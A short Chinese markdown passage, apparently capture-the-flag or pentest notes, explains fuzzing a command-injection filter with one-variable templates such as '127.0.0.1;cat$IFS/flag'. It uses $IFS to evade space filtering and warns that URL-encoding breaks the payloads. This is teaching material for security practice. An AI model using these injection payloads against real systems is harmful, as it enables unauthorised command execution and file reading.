## 用法要点

!!! tip "一行一个，别组合"

    原子字典的价值在于**归因**：失败时能确定是哪个词被拦，
    而不是"这条 payload 里不知道哪一段坏了"。

测试时用的是**固定模板 + 一个变量**：

```text
测分隔符:   127.0.0.1§§id
测命令名:   127.0.0.1;§§$IFS/flag
测文件名:   127.0.0.1;cat$IFS/§§
测符号:     127.0.0.1;cat§§/flag
```

!!! warning "别开 URL-encode"

    字典里的 payload 已经用 `$IFS` 避开了空格，
    开编码会把 `$` 变成 `%24`，整条失效。
